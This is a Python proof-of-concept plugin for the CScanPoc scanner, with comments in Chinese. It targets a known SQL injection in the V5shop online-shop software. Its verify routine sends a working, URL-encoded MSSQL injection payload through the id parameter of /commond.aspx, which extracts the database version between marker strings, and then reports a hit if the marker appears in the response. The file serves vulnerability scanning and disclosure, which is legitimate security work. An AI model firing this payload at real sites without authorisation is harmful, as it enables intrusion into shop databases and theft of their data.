# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'V5shop_0003'  # 平台漏洞编号，留空
    name = 'V5shop SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-11-17'  # 漏洞公布时间
    desc = '''
        V5Shop网店系统是上海威博旗下一款B to C网上开店软件产品，适合中小型企业及个人快速构建个性化网上商店。上海威博创始于2002年，是中国最具技术实力、国内市场占有率最高的电子商务系统提供商之一。旗下拥有V5SHOP网店系统个人版、V5SHOP企业级电子商务系统标准版、V5SHOP企业级电子商务系统双核版、V5SHOP企业级电子商务系统全程版、V5MALL商城系统、V5SHOP多国语言系统、V5SHOP联盟系统以及众多网店辅助工具。
        V5shop网店建设系统/commond.aspx 页面参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=043157'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'V5shop'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e1e6d65c-9176-4c07-b305-f4c598db523e'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2013-043157
            path = '/commond.aspx'
            payload = '?id=%28SELECT%20CHAR%28113%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28@@version%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29'
            verify_url = self.target + path + payload
            r = requests.get(verify_url)

            if 'qbbzqMicrosoft SQL Server' in r.text:
                # security_hole(arg+path2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
